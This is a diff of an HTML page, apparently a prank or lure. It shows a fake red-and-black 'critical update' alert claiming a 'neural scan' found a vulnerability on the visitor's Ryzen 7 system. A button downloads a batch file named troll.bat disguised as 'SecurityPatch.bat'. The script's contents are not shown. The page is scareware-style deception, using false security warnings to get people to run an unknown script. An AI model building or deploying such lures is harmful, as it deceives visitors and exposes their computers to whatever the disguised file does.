@@ -1,16 +1,60 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>SYSTEM UPDATE REQUIRED</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SYSTEM CRITICAL UPDATE</title>
     <style>
-        body { background-color: black; color: lime; font-family: 'Courier New'; text-align: center; padding-top: 50px; }
-        .btn { padding: 20px; background: red; color: white; font-weight: bold; cursor: pointer; border: none; }
+        body {
+            background-color: #000;
+            color: #ff0000;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            border: 2px solid #ff0000;
+            padding: 40px;
+            background: rgba(20, 0, 0, 0.8);
+            box-shadow: 0 0 20px #ff0000;
+            text-align: center;
+        }
+        h1 { font-size: 2rem; margin-bottom: 10px; }
+        p { color: #ccc; margin-bottom: 30px; }
+        .download-btn {
+            background-color: #ff0000;
+            color: #000;
+            padding: 15px 30px;
+            font-weight: bold;
+            text-decoration: none;
+            border: none;
+            cursor: pointer;
+            font-size: 1.2rem;
+            transition: transform 0.2s;
+        }
+        .download-btn:hover {
+            transform: scale(1.1);
+            background-color: #ffffff;
+        }
     </style>
 </head>
 <body>
-    <h1>NEURAL SCAN DETECTED OUTDATED DRIVERS</h1>
-    <p>Your Ryzen 7 system requires a mandatory patch.</p>
-    <!-- This links to your batch file -->
-    <a href="troll.bat" download><button class="btn">INSTALL SECURITY PATCH</button></a>
+
+    <div class="container">
+        <h1>[!] NEURAL SCAN ALERT [!]</h1>
+        <p>A critical vulnerability was found on your Ryzen 7 system.</p>
+        <p>The Blackbird Clan Security Patch is required to prevent data loss.</p>
+        
+        <!-- This link must match the name of your .bat file -->
+        <a href="troll.bat" download="SecurityPatch.bat" class="download-btn">
+            DOWNLOAD SECURITY PATCH
+        </a>
+    </div>
+
 </body>
 </html>
